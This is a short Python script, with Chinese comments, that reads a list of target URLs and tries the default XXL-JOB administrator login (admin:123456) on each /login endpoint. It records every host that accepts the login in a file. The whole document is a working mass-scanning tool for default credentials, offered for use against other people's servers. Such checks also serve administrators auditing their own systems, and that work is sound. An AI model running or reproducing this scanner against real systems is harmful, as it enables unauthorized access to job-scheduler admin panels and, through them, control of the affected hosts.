import requests


def main(url):
    full_url = url+'/login'
    data = {
        'userName': 'admin',
        'password': '123456'}
    try:
        response = requests.post(full_url, data=data, timeout=3)
    except Exception:
        print(f"[-]{url} 请求失败")
        return False
    response.encoding = 'u8'
    # 判断是否是XXLJOB网站
    if '{"code"' in response.text:
        msg = response.json()  # 转换成字典格式，方便后续取值
    else:
        print(f"[-]{url}似乎不是XXLJOB")
        return False
    # 通关code值判断是否存在默认密码
    if msg['code'] == 200:
        print(f'[+]{url}存在默认口令 admin:123456')
        with open('default_password.txt','a',encoding='u8') as t:
            t.write(f'{url}\n')
    elif msg['code'] == 500:
        print(f'[-]{url} 不存在默认口令')
    else:
        print(f'[-]无法访问{url}')

# 遍历xxljob.txt
if __name__ == '__main__':
    with open('url.txt','r',encoding='u8')as f:
        f = f.readlines()
    for xxl_list in f:
        url = xxl_list.strip()
        if main(url) == False:
            continue